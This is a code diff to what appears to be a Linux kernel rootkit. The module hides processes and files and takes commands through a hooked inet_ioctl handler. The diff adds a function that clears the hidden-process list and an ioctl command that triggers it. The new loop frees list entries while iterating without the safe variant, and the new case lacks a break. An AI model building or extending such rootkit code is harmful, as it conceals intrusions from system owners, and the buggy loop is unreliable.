@@ -433,6 +433,17 @@ void unhide_proc ( unsigned short pid )
     }
 }
 
+void clean_hide_proc()
+{
+    struct hidden_proc *hp;
+
+    list_for_each_entry(hp, &hidden_procs, list)
+    {
+	list_del(&hp->list);
+	kfree(hp);
+    }
+}
+
 void hide_file ( char *name )
 {
     struct hidden_file *hf;
@@ -970,6 +981,20 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                 break;
 
+            case 18:
+                {
+
+                    struct s_proc_args proc_args;
+
+                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
+                    if ( ret )
+                        return 0;
+
+                    DEBUG("Clean Hiddden PID\n");
+
+                    clean_hide_proc();
+		
+                }
             default:
                 break;
         }
